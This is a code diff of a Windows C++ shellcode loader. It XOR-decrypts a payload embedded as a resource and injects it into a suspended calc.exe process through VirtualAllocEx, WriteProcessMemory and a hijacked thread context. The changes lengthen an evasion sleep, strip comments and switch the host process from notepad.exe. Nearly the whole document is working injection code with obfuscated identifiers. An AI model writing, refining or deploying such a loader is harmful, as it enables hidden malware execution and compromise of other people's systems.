@@ -1,10 +1,15 @@
 #include <windows.h>
-#include <string>
 #include <tlhelp32.h>
 #include <wincrypt.h>
 
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
+
+void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
+    for (DWORD da = 0; da < c1o2d3e4Len; da++) {
+        c1o2d3e4[da] ^= k1e2y6[da % k1e2y6Len];
+    }
+}
 
 void loadResource_with(const char* renamer, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
@@ -15,31 +20,18 @@ void loadResource_with(const char* renamer, char** data, DWORD* size) {
     *data = (char*)LockResource(hResData);
 }
 
-void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
-    for (DWORD da = 0; da < c1o2d3e4Len; da++) {
-        c1o2d3e4[da] ^= k1e2y6[da % k1e2y6Len];
-    }
-}
-
 int main() {
-    Sleep(2500);
-
-    
+    Sleep(4000);
     char* key101k;
     DWORD key101kLen;
     loadResource_with("dhanushkey1", &key101k, &key101kLen);
-
     char* code199k;
     DWORD code199kLen;
     loadResource_with("dhanushcode56", &code199k, &code199kLen);
-
-    // Create a new process in a suspended stat
-    std::string path = "C:\\Windows\\System32\\notepad.exe";
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
-
-    CreateProcess(path.c_str(), NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcess("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
       
 
     
@@ -50,19 +42,16 @@ int main() {
 
     LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);
-
-    // Write payload to target process
     WriteProcessMemory(pi.hProcess, memlo, code199k, code199kLen, NULL);
-    // Update entry point
-    ctx.Rcx = (DWORD64)memlo; // Use Rcx for x64 processes
+    
+    ctx.Rcx = (DWORD64)memlo; 
     SetThreadContext(pi.hThread, &ctx);
 
-    // Resume thread to execute payload
     ResumeThread(pi.hThread); 
 
     
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    //CloseHandle(pi.hThread);
+    //CloseHandle(pi.hProcess);
 
     return 0;
 }
